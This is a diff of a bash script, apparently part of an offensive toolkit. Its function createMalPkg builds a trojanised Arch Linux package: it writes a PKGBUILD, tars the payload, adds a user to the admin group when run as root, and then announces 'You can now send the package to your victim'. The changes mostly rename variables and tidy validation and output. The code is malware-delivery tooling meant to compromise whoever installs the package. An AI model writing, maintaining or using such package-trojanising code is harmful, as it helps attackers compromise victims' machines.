@@ -5,7 +5,7 @@ _pkgbuild(){
 	$line
     done << EOF > PKGBUILD
 echo # Maintainer: Your Name <${email}>
-echo pkgname=${CUT_IT}
+echo pkgname=${fileName}
 echo pkgver=${vnumber}
 echo pkgrel=1
 echo pkgdir=/usr/local/bin
@@ -30,15 +30,15 @@ createMalPkg() {
 		chmod -R 777 "../${dirfile}"
 		chk_file;
 		packagedetails
-		mkdir "${CUT_IT}-${vnumber}"
-		mv "${CUT_IT}" "$_"
-		tar -cvf "${CUT_IT}-${vnumber}.tar.gz" "${CUT_IT}-${vnumber}"
-		rm -rf "${CUT_IT}-${vnumber}"
+		mkdir "${fileName}-${vnumber}"
+		mv "${fileName}" "$_"
+		tar -cvf "${fileName}-${vnumber}.tar.gz" "${fileName}-${vnumber}"
+		rm -rf "${fileName}-${vnumber}"
 		_pkgbuild
 		chmod 777 PKGBUILD
 		
 		[[ "$(whoami)" == "root" ]] && \
-		    printf "\n\a${open}${light}${red}[!]I cannot Package If you are root${close}\n" && \
+		    printf "\n\a${open}${bold}${red}[!]I cannot Package If you are root${close}\n" && \
 		    {
 			while printf "${open}${light}${green}%s\n: ${close}" "specify a user to package with"; read myUser junk
 			do
@@ -51,14 +51,11 @@ createMalPkg() {
 				adduser "${myUser}" admin && \
 				
 				break
-			    if [ $( grep ^"$myUser" /etc/passwd ) ];then
+			    if grep ^"$myUser" < /etc/passwd ;then
 				break
-			    else
-				printf "\n${open}${bold}${red}Invalid User has been specified\n"
-				continue
 			    fi
-			    
-			    
+			    printf "\n${open}${bold}${red}Invalid User has been specified\n"
+			    continue			    
 			done
 			
 			
@@ -72,15 +69,15 @@ createMalPkg() {
 			>/dev/tcp/google.com/80
 		    [[ $? != 0 ]] && \
 			echo "${open}${light}${red}Please Check Your internet Conectivity or install bsdtar mannually${close}" && {
-			    [ "${myUser}" == "blackorphan" ] && \
-				userdel "${myUser}" && exit 2
+			    [[ "${myUser}" == "blackorphan" ]] && {
+				userdel "${myUser}"
+				exit 2
+			    }
 			    
 			    exit 2
 			}
-		    ##This is bad comeback here and fix this
-		    #test { apt-get update && apt-get install bsdtar }  || yum install bsdtar
-		    
 		}
+		
 		gksu -u "${myUser}" "${CRYPT}/misc/makepkg -g >> PKGBUILD"
 		
 		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
@@ -98,7 +95,7 @@ createMalPkg() {
 		
 		printf "${open}${light}${green}Ok we are done here..${close}\n"
 		printf "${open}${light}${green}You can now send the package to your victim${close}\n"
-		sleep 3
+
 		echo ""
 		box3d
 		break
@@ -109,7 +106,7 @@ createMalPkg() {
 		shit_func ;;
 	    
 	    *)
-		echo "${open}${bold}${red}Invalid response ${close}"
+		printf "${open}${bold}${red}%s${close}" "Invalid response"
 		;;
 	esac
     done
